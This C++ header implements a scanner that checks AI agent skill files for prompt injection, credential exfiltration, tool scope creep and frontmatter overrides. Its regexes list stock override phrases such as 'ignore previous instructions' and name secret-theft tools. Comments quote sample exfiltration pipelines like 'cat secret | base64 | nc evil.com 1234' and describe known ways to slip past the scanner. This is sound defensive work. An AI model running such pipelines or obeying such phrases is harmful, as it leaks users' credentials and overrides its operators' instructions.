#pragma once

// skillscan.h — P1-C automatic skill security scanning.
// Scans markdown skill files LINE BY LINE for four vulnerability categories:
//
//   INJECTION   — case-insensitive, word-boundary-anchored prompt-injection phrases (CRITICAL;
//                 single generic words downgrade to WARN)
//   EXFILTRATE  — shell snippets that exfiltrate env vars or credentials (CRITICAL)
//   SCOPE-CREEP — body requests tools absent from the allowed-tools: frontmatter (WARN)
//   FRONTMATTER — YAML keys attempting to set model/system/temperature (WARN)
//
// No tree-sitter — ripwire has no markdown grammar. Pure line-iteration, PLUS a second pass inside
// `scanSkillText` over a whitespace-normalized join of the body (INJECTION only) to catch a phrase
// split across a newline.
// Pattern matching: std::regex throughout (ECMAScript, icase where relevant); INJECTION patterns
// are word-boundary-anchored phrases, not bare substrings (a bare substring like "disregard"
// false-positives on "disregarding", and "new persona" on "new personal").
// Findings sorted by (line, rule) for determinism, then deduped on (line, rule) — the per-line and
// joined-body passes can both find the same phrase (byte-identical output across runs).
//
// Style: Allman braces; spaces inside parens; VERIFY/DEGRADED_PATH_ALERT; ~160–200 col wrap.

#include <algorithm>
#include <cctype>
#include <cstdio>
#include <cstdint>
#include <filesystem>
#include <fstream>
#include <iterator>
#include <regex>
#include <sstream>
#include <string>
#include <string_view>
#include <utility>
#include <vector>

#include "infra/Diagnostics.h"

namespace rw
{

// ── severity + finding ────────────────────────────────────────────────────────────────────────────

enum class SkillSeverity : std::uint8_t { Info = 0, Warn = 1, Critical = 2 };

struct SkillFinding
{
    SkillSeverity sev;
    int           line;       // 1-based line number in the scanned file
    const char*   rule;       // stable rule name — points into the static pattern table
    std::string   excerpt;    // the offending line, trimmed to ≤120 chars
};

inline const char* skillSeverityStr( SkillSeverity s ) noexcept
{
    switch( s )
    {
        case SkillSeverity::Critical: return "CRITICAL";
        case SkillSeverity::Warn:     return "WARN    ";
        default:                      return "INFO    ";
    }
}

// ── declarative pattern table ─────────────────────────────────────────────────────────────────────

namespace detail
{

// Trim trailing whitespace (for excerpt display).
inline std::string_view trimRight( std::string_view s ) noexcept
{
    while( !s.empty() && std::isspace( static_cast<unsigned char>( s.back() ) ) )
    {
        s.remove_suffix( 1 );
    }
    return s;
}

// ── INJECTION phrase table (CRITICAL, with a generic-word WARN fallback) ────────────────────────
//
// A4-F12 fix: bare substrings ("disregard", "you are now", "new persona") false-positive on
// ordinary prose — "disregarding trailing whitespace", "Once you are now confident, run the
// tests", "the new personal access token" (⊃ "new persona" as a raw substring). Two changes:
//   1. Every phrase is word-boundary-anchored (\b...\b) so "disregard" no longer matches inside
//      "disregarding", and "new persona" no longer matches inside "new personal".
//   2. The genuinely ambiguous multi-word phrases are additionally ANCHORED to a continuation
//      that only shows up in a real imperative ("you are now A/AN/THE ...", "disregard
//      (all/the) previous/above ..."); a lone "disregard" that doesn't fit that shape downgrades
//      to WARN instead of CRITICAL (still worth a human glance, not a `wrap` blocker).
// Compiled once per `scanSkillText` call via `buildInjectionPatterns()` — std::regex is not
// trivially copyable so these can't be a `constexpr` array like the old literal table.
struct InjectionPattern
{
    const char*   regexSrc;   // ECMAScript regex source (compiled case-insensitive)
    const char*   rule;       // stable rule name emitted in findings
    SkillSeverity sev;        // CRITICAL for an anchored imperative, WARN for a bare generic word
    std::regex    re;
};

// Keep entries in stable order (deterministic table iteration → deterministic findings order
// when a line matches multiple patterns — we break after the first match per line). Anchored
// (CRITICAL) forms are listed before their generic (WARN) fallback so the anchored form wins
// when both would match.
inline std::vector<InjectionPattern> buildInjectionPatterns()
{
    std::vector<InjectionPattern> v;
    const auto add = [ & ]( const char* src, const char* rule, SkillSeverity sev )
    {
        v.push_back( { src, rule, sev, std::regex( src, std::regex::ECMAScript | std::regex::icase ) } );
    };

    add( R"(\bignore\s+(all\s+|the\s+)?previous\s+instructions\b)", "INJECTION:ignore-prev",     SkillSeverity::Critical );
    add( R"(\bdisregard\s+(all\s+|the\s+)?(previous|above)\b)",     "INJECTION:disregard",       SkillSeverity::Critical );
    add( R"(\byou\s+are\s+now\s+(a|an|the)\b)",                     "INJECTION:you-are-now",     SkillSeverity::Critical );
    add( R"(\boverride\s+system\b)",                                "INJECTION:override-system", SkillSeverity::Critical );
    add( R"(\bnew\s+persona\b)",                                    "INJECTION:new-persona",     SkillSeverity::Critical );
    add( R"(\bforget\s+everything\s+above\b)",                      "INJECTION:forget-above",    SkillSeverity::Critical );
    add( R"(\bdisregard\b)",                                        "INJECTION:disregard-generic", SkillSeverity::Warn );

    return v;
}

// ── EXFILTRATE shell-snippet patterns (CRITICAL) ──────────────────────────────────────────────────
//
// We use std::regex (ECMAScript) for these — they involve combinations of tokens across a
// single line that are more naturally expressed as a regex. The regex is compiled once per
// call to `scanSkillText`; the construction is in `buildExfilPatterns()`.
//
// Rules:
//   EXFIL-APIKEY : line contains $ANTHROPIC_API_KEY
//   EXFIL-SSH    : line contains $HOME/.ssh or ~/.ssh or ~/.aws
//   EXFIL-NETEXFIL : line contains (curl|wget|nc) AND ($env-var OR base64), in EITHER order,
//                    fenced-code lines only (prose mentions are not flagged)
//
// "base64 + send" pattern — a line that contains base64 AND (curl|wget|nc), in either order
// (`… | base64 | nc host port` included) — is covered by EXFIL-NETEXFIL.
struct ExfilPattern
{
    const char* rule;
    std::regex  re;
    bool        requiresCmdContext;   // true ⇒ fires only in a fence OR alongside a transmit verb elsewhere on
                                       // the line (see hasTransmitVerb) — a bare prose mention is documentation.
    bool        fenceOnly;            // true ⇒ fires only inside a fenced code block (see net-exfil below).
    // std::regex is NOT trivially copyable → we build these at runtime once.
};

inline std::vector<ExfilPattern> buildExfilPatterns()
{
    std::vector<ExfilPattern> v;

    // Any reference to the API key environment variable. A bare prose mention (a skill that DOCUMENTS the
    // pattern, e.g. ripwire's own audit skills) is not exfiltration — require command context (a fenced
    // run-block or a co-occurring transmit verb on the line). See scanSkillText's cmdContext gate.
    v.push_back( {
        "EXFILTRATE:api-key",
        std::regex( R"(\$ANTHROPIC_API_KEY)", std::regex::ECMAScript | std::regex::icase ),
        /*requiresCmdContext=*/true, /*fenceOnly=*/false
    } );

    // SSH private key or AWS credentials directories. Same as above: "reads from `~/.ssh`" in a prose list is
    // documentation; `cat ~/.ssh/id_rsa | base64 | nc …` in a fenced block is the real thing.
    v.push_back( {
        "EXFILTRATE:ssh-aws-creds",
        std::regex( R"((\$HOME/\.ssh|~/\.ssh|~/\.aws))", std::regex::ECMAScript ),
        /*requiresCmdContext=*/true, /*fenceOnly=*/false
    } );

    // Network exfiltration: (curl|wget|nc) combined with an env-var read or base64 on ONE line, in EITHER
    // order. A4-F12: the previous pattern assumed the network tool comes first, but real exfil pipelines put
    // it LAST — `cat secret | base64 | nc evil.com 1234` — which the tool-first-only regex never matched
    // despite this docstring claiming it did. The two alternatives below cover both orders.
    //
    // Context gate: `fenceOnly`, not `requiresCmdContext`. The generic requiresCmdContext gate
    // (lineInFence || hasTransmitVerb) is a no-op for this rule — hasTransmitVerb's verb list is a superset
    // of {curl, wget, nc}, so it is already true whenever this regex matches at all. Without a real gate,
    // prose like "use curl to fetch $VARIABLE from the API" (no fence, no pipe, just an explanatory
    // sentence) matches the pattern and would fire CRITICAL. Requiring the line to be inside a fenced code
    // block is what actually distinguishes a documented/live command from a prose mention.
    v.push_back( {
        "EXFILTRATE:net-exfil",
        std::regex( R"((\b(curl|wget|nc)\b.*(\$[A-Za-z_][A-Za-z0-9_]*|base64))|((\$[A-Za-z_][A-Za-z0-9_]*|base64).*\b(curl|wget|nc)\b))",
                     std::regex::ECMAScript ),
        /*requiresCmdContext=*/false, /*fenceOnly=*/true
    } );

    return v;
}

// A "command context" for an exfil pattern: the line is inside a fenced code block (where run-commands
// live) OR it carries a transmit/encode verb (the credential is actually being read + shipped, not merely
// named in prose). This is what separates a malicious skill from one that documents the attack.
inline bool hasTransmitVerb( std::string_view line ) noexcept
{
    static const std::regex kVerb( R"(\b(base64|curl|wget|nc|scp|cat|openssl)\b)", std::regex::ECMAScript );
    return std::regex_search( std::string( line ), kVerb );
}

// True if the byte at [pos] on `line` falls inside a BALANCED inline-code span (`…`) or a balanced
// double-quoted ("…") span — i.e. the matched text is being SHOWN AS DATA / an example, not stated as an
// instruction to the agent.  A prompt injection only works as bare imperative prose; once fully enclosed
// in a balanced open/close pair it is inert (the agent reads it as a string).
//
// Previous implementation used an odd-count-of-backticks-before-pos heuristic, which is trivially evaded
// by inserting a single stray backtick or quote anywhere before the phrase (the leading ` does not need to
// close before the phrase — the odd-count fires regardless).  This version requires the phrase to actually
// sit between a matched open-tick and a close-tick (or open-quote and close-quote) that BOTH appear on the
// same line.
//
// Algorithm: scan the line and track open spans.  A backtick at position i either OPENS a new span (if we
// are not already inside one) or CLOSES the current open span.  After scanning, check whether [pos,
// pos+phraseLen) is entirely contained within any closed span.  Same for double-quotes.
//
// Residual evasion envelope: a deliberately multi-backtick construction like `` `phrase` `` (two ticks open,
// one close — parsed as an unclosed span by this scanner) is NOT treated as data, which is the safer
// failure mode.  The scanner is a best-effort heuristic linter, not a sandbox.
inline bool isShownAsData( std::string_view line, std::size_t pos, bool quotesCountAsData = true ) noexcept
{
    const std::size_t N = line.size();

    // ── check balanced backtick spans ─────────────────────────────────────────────────────────────
    {
        bool  inSpan  = false;
        std::size_t spanStart = 0;
        for( std::size_t i = 0; i < N; ++i )
        {
            if( line[i] != '`' )
            {
                continue;
            }
            if( !inSpan )
            {
                inSpan    = true;
                spanStart = i + 1;   // span content starts after the opening tick
            }
            else
            {
                // Closing tick at i: span covers [spanStart, i).
                // The phrase at [pos, …) is "inside" if pos >= spanStart AND pos < i.
                if( pos >= spanStart && pos < i )
                {
                    return true;
                }
                inSpan = false;
            }
        }
        // Unclosed span: do NOT treat as data — an unmatched opening tick is not a real inline-code span.
    }

    // ── check balanced double-quote spans (skipped in YAML frontmatter, where quotes are syntax) ──
    if( quotesCountAsData )
    {
        bool  inSpan  = false;
        std::size_t spanStart = 0;
        for( std::size_t i = 0; i < N; ++i )
        {
            if( line[i] != '"' )
            {
                continue;
            }
            if( !inSpan )
            {
                inSpan    = true;
                spanStart = i + 1;
            }
            else
            {
                if( pos >= spanStart && pos < i )
                {
                    return true;
                }
                inSpan = false;
            }
        }
        // Unclosed quote: do NOT treat as data.
    }

    return false;
}

// ── FRONTMATTER overreach: YAML keys attempting to set model/system/temperature (WARN) ──────────
//
// We are inside the YAML frontmatter block (between the two `---` delimiters) when these match.
// The scanner tracks frontmatter state.
struct FrontmatterPattern
{
    const char* rule;
    std::regex  re;
};

inline std::vector<FrontmatterPattern> buildFrontmatterPatterns()
{
    std::vector<FrontmatterPattern> v;

    // model: something (attempting to override the model at the harness level)
    v.push_back( {
        "FRONTMATTER:model-override",
        std::regex( R"(^\s*model\s*:)", std::regex::ECMAScript )
    } );

    // system: something (attempting to inject a system prompt above the harness)
    v.push_back( {
        "FRONTMATTER:system-override",
        std::regex( R"(^\s*system\s*:)", std::regex::ECMAScript )
    } );

    // temperature: (attempting to override inference parameters)
    v.push_back( {
        "FRONTMATTER:temperature-override",
        std::regex( R"(^\s*temperature\s*:)", std::regex::ECMAScript )
    } );

    return v;
}

// ── SCOPE-CREEP: body references Bash/shell/network execution without it being allowed ──────────
//
// Strategy (conservative / precision-over-recall — false CRITICALs are worse than misses):
// 1. Parse `allowed-tools:` from frontmatter.
// 2. If Bash is NOT in allowed-tools AND the body contains shell execution indicators
//    (backtick-fenced or `$(...) ` or `curl/wget` outside a quoted example), flag WARN.
//
// We flag WARN (not CRITICAL) because scope-creep is a policy issue, not directly injective.
//
// Shell indicators in the body (outside frontmatter):
//   - Lines starting with ``` or ` that contain shell commands
//   - curl / wget appearing in what looks like an instruction (not in a ---fenced block)

static constexpr const char* kScopeCreepRule = "SCOPE-CREEP:bash-not-allowed";

// Parse the `allowed-tools:` line from the frontmatter portion (raw text, all lines).
// Returns the set of tool names mentioned (trimmed, no quotes).
inline std::vector<std::string> parseAllowedTools( const std::vector<std::string>& lines, int frontmatterEnd )
{
    std::vector<std::string> tools;
    for( int i = 0; i < frontmatterEnd && i < int( lines.size() ); ++i )
    {
        const std::string& ln = lines[i];
        // Match "allowed-tools: Bash, Read, ..." (or "allowed-tools: [Bash, Read]")
        const std::size_t pos = ln.find( "allowed-tools:" );
        if( pos == std::string::npos )
        {
            continue;
        }

        std::string rest = ln.substr( pos + 14 );   // after "allowed-tools:"
        // strip leading whitespace and optional [ ]
        std::size_t s = 0;
        while( s < rest.size() && ( rest[s] == ' ' || rest[s] == '\t' || rest[s] == '[' ) )
        {
            ++s;
        }
        std::size_t e = rest.size();
        while( e > s && ( rest[e - 1] == ' ' || rest[e - 1] == '\t' || rest[e - 1] == ']' || rest[e - 1] == '\r' || rest[e - 1] == '\n' ) )
        {
            --e;
        }
        rest = rest.substr( s, e - s );

        // comma-split
        std::istringstream ss( rest );
        std::string tok;
        while( std::getline( ss, tok, ',' ) )
        {
            std::size_t ts = 0, te = tok.size();
            while( ts < te && std::isspace( static_cast<unsigned char>( tok[ts] ) ) )
            {
                ++ts;
            }
            while( te > ts && std::isspace( static_cast<unsigned char>( tok[te - 1] ) ) )
            {
                --te;
            }
            if( ts < te )
            {
                tools.push_back( tok.substr( ts, te - ts ) );
            }
        }
        break;   // only the first allowed-tools: line matters
    }
    return tools;
}

inline bool toolAllowed( const std::vector<std::string>& tools, std::string_view name ) noexcept
{
    for( const std::string& t : tools )
    {
        if( std::string_view( t ) == name )
        {
            return true;
        }
    }
    return false;
}

}   // namespace detail


// ── core scanner ─────────────────────────────────────────────────────────────────────────────────

// Scan the raw text of a skill markdown file line by line. Findings are sorted (line, rule).
inline std::vector<SkillFinding> scanSkillText( std::string_view text )
{
    using namespace detail;

    // Build regex patterns once per call (cheap for the sizes involved).
    const std::vector<ExfilPattern>       exfilPats  = buildExfilPatterns();
    const std::vector<FrontmatterPattern> frontPats  = buildFrontmatterPatterns();
    const std::vector<InjectionPattern>   injPats    = buildInjectionPatterns();

    std::vector<SkillFinding> findings;

    // Split into lines (retain line content for matching and excerpt extraction).
    std::vector<std::string> lines;
    {
        std::size_t start = 0;
        while( start <= text.size() )
        {
            const std::size_t nl = text.find( '\n', start );
            const std::size_t end = ( nl == std::string_view::npos ) ? text.size() : nl;
            lines.emplace_back( text.substr( start, end - start ) );
            start = end + 1;
        }
        // If the last character was '\n', we get an empty trailing entry — trim it.
        if( !lines.empty() && lines.back().empty() )
        {
            lines.pop_back();
        }
    }

    // ── frontmatter state: find the YAML block (first `---` to second `---`) ────────────────────
    int frontmatterEnd = 0;   // index of the line AFTER the closing `---` (or 0 if none)
    {
        bool inFront = false;
        for( int i = 0; i < int( lines.size() ); ++i )
        {
            const std::string_view ln = trimRight( lines[i] );
            if( i == 0 && ln == "---" ) { inFront = true; continue; }
            if( inFront && ln == "---" ) { frontmatterEnd = i + 1; break; }
        }
    }

    // Parse allowed-tools from frontmatter for scope-creep check.
    const std::vector<std::string> allowedTools = parseAllowedTools( lines, frontmatterEnd );
    const bool                      bashAllowed  = toolAllowed( allowedTools, "Bash" );

    // helper: add a finding with a clipped excerpt
    const auto addFinding = [ & ]( SkillSeverity sev, int lineNum, const char* rule, std::string_view lineText )
    {
        std::string excerpt( trimRight( lineText ) );
        if( excerpt.size() > 120 ) { excerpt.resize( 117 ); excerpt += "..."; }
        findings.push_back( { sev, lineNum, rule, std::move( excerpt ) } );
    };

    // ── fenced-block injection suppression policy ─────────────────────────────────────────────────
    //
    // A fenced code block with a recognised EXAMPLE language tag (text, example, output, none, plain, raw)
    // is treated as documentation data — injection phrases inside are suppressed (the author is SHOWING the
    // pattern, not issuing it).  Example: ```text\nIgnore previous instructions\n``` in docs.md.
    //
    // A BARE fence (no language tag, just ```) or an executable-language fence (bash, sh, python, …) is
    // treated as prose the agent will act on — injection phrases inside ARE flagged CRITICAL.  Rationale:
    // an attacker wrapping a bare ``\nIgnore…\n``` is still issuing an imperative; a bare fence does not
    // make the content inert.  A few false positives on contrived docs are acceptable; a missed real
    // injection is not.
    //
    // Residual evasion envelope: a fence tagged ```example or ```text that genuinely contains an injection
    // directive will be suppressed — an attacker who knows this can evade.  Tag-based suppression is still
    // better than the prior unconditional suppression of ALL fences.
    //
    // The `requiresCmdContext` EXFIL patterns already need the line to be in a fence (command context) to
    // fire — so EXFIL detection keeps its original lineInFence gate (commands in fences are real).
    // INJECTION detection uses `lineInExampleFence` for its suppression (not lineInFence).

    // Returns true if the given fence-opening language tag is a purely-example/data marker (not executable).
    const auto isExampleFenceLang = []( std::string_view tag ) noexcept -> bool
    {
        // Normalise: strip leading/trailing whitespace.
        while( !tag.empty() && std::isspace( static_cast<unsigned char>( tag.front() ) ) )
        {
            tag.remove_prefix( 1 );
        }
        while( !tag.empty() && std::isspace( static_cast<unsigned char>( tag.back() ) ) )
        {
            tag.remove_suffix( 1 );
        }
        // Empty tag → bare fence → NOT an example fence (treat as live prose → injection may fire).
        if( tag.empty() )
        {
            return false;
        }
        // Recognised data/example markers.
        return tag == "text"    || tag == "example"  || tag == "output"
            || tag == "none"    || tag == "plain"    || tag == "raw"
            || tag == "markup"  || tag == "template";
    };

    // Accumulator for the whitespace-normalized joined-body INJECTION pass (A4-F12 §3): the body's
    // non-example-fence lines, whitespace-collapsed and space-joined, plus each line's start offset in the
    // joined buffer so a cross-line match can be attributed back to a real line number.
    std::string                              joinedBody;
    std::vector<std::pair<std::size_t,int>>  joinedLineOffsets;

    // ── scan each line ────────────────────────────────────────────────────────────────────────────
    bool inFence        = false;   // inside a ``` / ~~~ fenced code block
    bool inExampleFence = false;   // inside a fence whose lang tag marks it as an EXAMPLE (data, not live)
    for( int i = 0; i < int( lines.size() ); ++i )
    {
        const int          lineNum = i + 1;        // 1-based
        const std::string& ln      = lines[i];
        const bool         inFront = ( frontmatterEnd > 0 && i > 0 && i < frontmatterEnd );
        const bool         inBody  = !inFront && ( frontmatterEnd == 0 || i >= frontmatterEnd );

        // fenced-code membership of THIS line is the state BEFORE a marker toggles it, so command lines
        // BETWEEN the ``` markers read lineInFence==true while the markers themselves read false.
        bool lineInFence        = false;
        bool lineInExampleFence = false;
        if( inBody )
        {
            lineInFence        = inFence;
            lineInExampleFence = inExampleFence;
            std::string_view lv = ln;
            while( !lv.empty() && ( lv.front() == ' ' || lv.front() == '\t' ) )
            {
                lv.remove_prefix( 1 );
            }
            if( lv.size() >= 3 && ( lv.compare( 0, 3, "```" ) == 0 || lv.compare( 0, 3, "~~~" ) == 0 ) )
            {
                if( !inFence )
                {
                    // Opening a new fence: extract the language tag (text after the marker).
                    std::string_view marker = lv.compare( 0, 3, "```" ) == 0 ? "```" : "~~~";
                    std::string_view langTag = lv.substr( marker.size() );
                    inExampleFence = isExampleFenceLang( langTag );
                    inFence = true;
                }
                else
                {
                    // Closing the current fence.
                    inFence        = false;
                    inExampleFence = false;
                }
            }
        }

        if( inFront )
        {
            // ── FRONTMATTER checks ────────────────────────────────────────────────────────────────
            for( const FrontmatterPattern& p : frontPats )
            {
                if( std::regex_search( ln, p.re ) )
                {
                    addFinding( SkillSeverity::Warn, lineNum, p.rule, ln );
                    break;   // one finding per line per category
                }
            }

            // ── INJECTION in frontmatter ──────────────────────────────────────────────────────────
            // The `description:` field is precisely the text harnesses inject into the agent's prompt —
            // an injection phrase there is MORE dangerous than one in the body, not exempt. YAML double
            // quotes are value syntax, not a shown-as-data marker, so only backtick spans suppress here.
            for( const InjectionPattern& p : injPats )
            {
                std::smatch m;
                if( std::regex_search( ln, m, p.re ) && !isShownAsData( ln, std::size_t( m.position( 0 ) ), /*quotesCountAsData=*/false ) )
                {
                    addFinding( p.sev, lineNum, p.rule, ln );
                    break;   // one INJECTION finding per line
                }
            }
        }

        if( inBody )
        {
            // ── INJECTION (case-insensitive literal) ──────────────────────────────────────────────
            // Flag a bare-prose imperative: NOT inside an example-tagged fence (```text / ```example),
            // and NOT fully enclosed in a balanced inline-code or double-quote span.
            //
            // A BARE fence (no lang tag) or an executable-language fence does NOT suppress injection
            // detection — a phrase like "Ignore previous instructions" inside a bare ``` block is still
            // prose the agent reads and acts on.  Only ```text / ```example / similar data-marker fences
            // represent "shown as data".
            //
            // isShownAsData now requires a BALANCED enclosing span (open tick before pos + close tick
            // after pos on the same line), not merely an odd count of preceding ticks/quotes.
            if( !lineInExampleFence )
            {
                for( const InjectionPattern& p : injPats )
                {
                    std::smatch m;
                    if( std::regex_search( ln, m, p.re ) && !isShownAsData( ln, std::size_t( m.position( 0 ) ) ) )
                    {
                        addFinding( p.sev, lineNum, p.rule, ln );
                        break;   // one INJECTION finding per line (highest-priority match)
                    }
                }

                // ── feed the whitespace-normalized joined-body pass (A4-F12 §3) ──────────────────────
                // A phrase split across a newline ("Ignore previous\ninstructions") matches nothing in the
                // per-line scan above. Collect this line's content (whitespace runs collapsed to one space)
                // into a single joined buffer scanned separately after this loop, recording where each
                // line's content starts in the buffer so a cross-line match can be attributed back to a
                // real line number. Lines inside an example fence are excluded here too — same policy as
                // the per-line scan just above.
                std::string normalized;
                normalized.reserve( ln.size() );
                bool prevWasSpace = false;
                for( char c : ln )
                {
                    if( std::isspace( static_cast<unsigned char>( c ) ) )
                    {
                        if( !prevWasSpace && !normalized.empty() )
                        {
                            normalized += ' ';
                        }
                        prevWasSpace = true;
                    }
                    else
                    {
                        normalized += c;
                        prevWasSpace = false;
                    }
                }
                while( !normalized.empty() && normalized.back() == ' ' )
                {
                    normalized.pop_back();
                }

                if( !normalized.empty() )
                {
                    if( !joinedBody.empty() )
                    {
                        joinedBody += ' ';
                    }
                    joinedLineOffsets.push_back( { joinedBody.size(), lineNum } );
                    joinedBody += normalized;
                }
            }

            // ── EXFILTRATE (regex) ────────────────────────────────────────────────────────────────
            // requiresCmdContext patterns (api-key, cred paths) fire only with command context — a fenced
            // run-block or a co-occurring transmit verb. A bare prose mention of a credential is documentation.
            // fenceOnly patterns (net-exfil) fire only inside a fenced code block — see buildExfilPatterns().
            for( const ExfilPattern& p : exfilPats )
            {
                if( !std::regex_search( ln, p.re ) )
                {
                    continue;
                }
                if( p.fenceOnly && !lineInFence )
                {
                    continue;
                }
                if( p.requiresCmdContext && !( lineInFence || hasTransmitVerb( ln ) ) )
                {
                    continue;
                }
                addFinding( SkillSeverity::Critical, lineNum, p.rule, ln );
                break;   // one EXFILTRATE finding per line
            }

            // ── SCOPE-CREEP check ─────────────────────────────────────────────────────────────────
            // Conservative: only flag if Bash is definitely not allowed AND the line looks like
            // an actual shell command instruction (starts after a backtick fence, or literally
            // starts with $, or contains `curl`/`wget`/`nc` in an imperative-looking context).
            // We flag WARN, not CRITICAL.
            if( !bashAllowed && !allowedTools.empty() )
            {
                const std::string_view lv = trimRight( ln );
                // Indicators: a line that starts an executable shell context:
                //   1. Inside a fenced ```bash / ```sh / ```shell block header
                //   2. Line starts with $ (interactive-shell style)
                //   3. Line contains curl/wget/nc (network tools — likely a shell instruction)
                static const std::regex kBashFenceRe( R"(^```\s*(bash|sh|shell|zsh)\s*$)", std::regex::ECMAScript );
                static const std::regex kNetToolRe( R"(\b(curl|wget|nc)\b)", std::regex::ECMAScript );
                const bool isShellFence   = std::regex_match( std::string( lv ), kBashFenceRe );
                const bool startsWithDollar = !lv.empty() && lv[0] == '$';
                const bool hasNetTool     = std::regex_search( std::string( lv ), kNetToolRe );
                if( isShellFence || startsWithDollar || hasNetTool )
                {
                    addFinding( SkillSeverity::Warn, lineNum, kScopeCreepRule, ln );
                }
            }
        }
    }

    // ── second pass: whitespace-normalized joined body (A4-F12 §3) ───────────────────────────────
    // Catches an INJECTION phrase split across a newline ("Ignore previous\ninstructions"), which the
    // per-line scan above never sees since neither half-line matches on its own. `joinedBody` collapses all
    // whitespace runs (incl. newlines) to single spaces, so a phrase that was only broken by line-wrapping
    // now reads as one contiguous run. Only the FIRST occurrence per pattern is reported here (this pass
    // exists to catch the evasion, not to duplicate the exhaustive per-line scan); the (line, rule) dedupe
    // below collapses the case where the same instance was already found per-line.
    for( const InjectionPattern& p : injPats )
    {
        std::smatch m;
        if( !std::regex_search( joinedBody, m, p.re ) )
        {
            continue;
        }
        const std::size_t pos = std::size_t( m.position( 0 ) );
        if( isShownAsData( joinedBody, pos ) )
        {
            continue;
        }

        // Map the match position back to a real line number: the start of the joined-body run whose
        // recorded offset is the greatest one not exceeding `pos`. Honest fallback: line 0 if somehow no
        // line offset was recorded (joinedBody built only from lines we did record, so this shouldn't
        // happen, but a degrade-safe default beats an out-of-range read).
        int lineNum = 0;
        {
            const auto it = std::upper_bound( joinedLineOffsets.begin(), joinedLineOffsets.end(), pos,
                []( std::size_t value, const std::pair<std::size_t,int>& entry ) noexcept { return value < entry.first; } );
            if( it != joinedLineOffsets.begin() )
            {
                lineNum = std::prev( it )->second;
            }
        }

        std::string matched = m.str( 0 );
        addFinding( p.sev, lineNum, p.rule, matched );
    }

    // ── sort by (line, rule) for deterministic output, then dedupe on (line, rule) ────────────────
    // The per-line pass and the joined-body pass can both find the SAME instance (e.g. a phrase that sits
    // entirely on one line is found per-line, then found again — same line, same rule — in the joined
    // buffer); collapse those to a single finding so output stays deterministic and non-redundant.
    std::sort( findings.begin(), findings.end(), []( const SkillFinding& a, const SkillFinding& b ) noexcept
               {
        if( a.line != b.line ) { return a.line < b.line;
}
        return std::string_view( a.rule ) < std::string_view( b.rule ); } );
    findings.erase( std::unique( findings.begin(), findings.end(), []( const SkillFinding& a, const SkillFinding& b ) noexcept
    {
        return a.line == b.line && std::string_view( a.rule ) == std::string_view( b.rule );
    } ), findings.end() );

    return findings;
}


// ── file and directory entry points ──────────────────────────────────────────────────────────────

// Scan a single skill file. Missing/unreadable → DEGRADED_PATH_ALERT + empty vector (never crash).
inline std::vector<SkillFinding> scanSkillFile( const std::string& path )
{
    std::ifstream f( path );
    if( !f )
    {
        DEGRADED_PATH_ALERT( "skillscan: cannot read skill file" );
        return {};
    }
    std::ostringstream buf;
    buf << f.rdbuf();
    if( f.bad() )
    {
        DEGRADED_PATH_ALERT( "skillscan: I/O error reading skill file" );
        return {};
    }
    return scanSkillText( buf.str() );
}

// Result of a checked scan: distinguishes "read the file, ran the scan, got N findings" (possibly
// zero — a legitimate clean scan) from "never scanned it — the path itself could not be read" (missing,
// permission-denied, or a directory). scanSkillFile() above collapses both cases to an empty vector for
// callers (wrap.h) that treat "cannot scan" the same as "nothing found"; the --scan-skill/--scan-skills
// CLI entry points need to tell them apart so an unreadable path can refuse instead of reporting a false
// clean scan (§P0.5a — a typo'd path must never read as "safe").
struct SkillFileReadResult
{
    bool                        readable = false;   // false = path could not be scanned at all
    std::vector<SkillFinding>   findings;            // valid only when readable == true
};

// NO DEGRADED_PATH_ALERT on the unreadable paths here, deliberately, and it is not an omission (M7/F20,
// capture-audit 2026-09-04). That log line means "this run CONTINUED in a reduced mode"; every caller of
// THIS function refuses instead, so printing it stamped a degrade notice on stderr immediately before a
// refusal that had degraded nothing — "[math degraded] skillscan: cannot read skill file (skillscan.h:786,
// …)" ahead of "cannot read '…' — no scan performed". The alert belongs to scanSkillFile() above, which is
// the entry point that really does swallow the failure and return an empty finding list to wrap.h.
inline SkillFileReadResult scanSkillFileChecked( const std::string& path )
{
    std::error_code ec;
    if( std::filesystem::is_directory( path, ec ) )
    {
        return {};
    }
    std::ifstream f( path );
    if( !f )
    {
        return {};
    }
    std::ostringstream buf;
    buf << f.rdbuf();
    if( f.bad() )
    {
        return {};
    }
    return { true, scanSkillText( buf.str() ) };   // empty file → empty findings → a legitimate clean scan
}

// NOTE: directory scanning (recursive .md discovery + per-file scan + exit-code aggregation) is
// done by the --scan-skills call site in main.cpp, not here — it needs per-file printing as it
// walks, which a `vector<SkillFinding>` with no file attribution cannot support. A prior
// `scanSkillDir()` duplicated that walk and returned findings with no path field (traceable to no
// file); it was unused (main.cpp never called it) and unusable, so it was removed rather than fixed.

// ── exit-code helper ──────────────────────────────────────────────────────────────────────────────

// 2 if any Critical, else 1 if any Warn, else 0.
inline int skillScanExitCode( const std::vector<SkillFinding>& findings ) noexcept
{
    int code = 0;
    for( const SkillFinding& f : findings )
    {
        if( f.sev == SkillSeverity::Critical )
        {
            return 2;
        }
        if( f.sev == SkillSeverity::Warn && code < 1 )
        {
            code = 1;
        }
    }
    return code;
}

// ── §P6.9 stdout artifact ─────────────────────────────────────────────────────────────────────────
//
// --scan-skill/--scan-skills were the only two verbs with no deterministic stdout artifact: on a CLEAN
// scan (the common case — vetting a skill before install) stdout was byte-empty, and even a dirty scan
// only got ad-hoc human-readable lines with no header a caller could parse for counts. Every OTHER verb
// in this tool emits exactly one well-formed document (XML, or markdown for --report/--recall) to stdout;
// this brings skillscan in line with a small, capped, deterministic `<skillscan>` element. stderr's tally
// line and the 0/1/2 verdict / 3 refusal exit codes are UNCHANGED (test/skillscanreadcheck.sh pins the
// refusal path — this artifact is emitted ONLY on the printSkillScanArtifact call sites, which sit strictly
// after the refusal `return 3`s in main.cpp, so a refused scan still has byte-empty stdout; test/skillscan.sh
// pins the verdicts, which are computed exactly as before).

constexpr std::size_t kSkillScanFindingCap = 200;   // generous for one file or a small dir; caps a pathological --scan-skills sweep

// minimal attribute-value XML escape. skillscan.h is intentionally dependency-light (it runs BEFORE the
// heavy ingest pipeline main.cpp defers to for everything else — see the call site comment), so this does
// not pull in serialize.h's escapeXml for one small attribute; paths here are filesystem paths, not
// arbitrary source text, so the 4-case table is enough (no CDATA/UTF-8-scrub machinery needed).
inline std::string escapeXmlAttr( std::string_view s )
{
    std::string out;
    out.reserve( s.size() );
    for( char c : s )
    {
        switch( c )
        {
            case '&':  out += "&amp;";  break;
            case '<':  out += "&lt;";   break;
            case '>':  out += "&gt;";   break;
            case '"':  out += "&quot;"; break;
            default:   out += c;        break;
        }
    }
    return out;
}

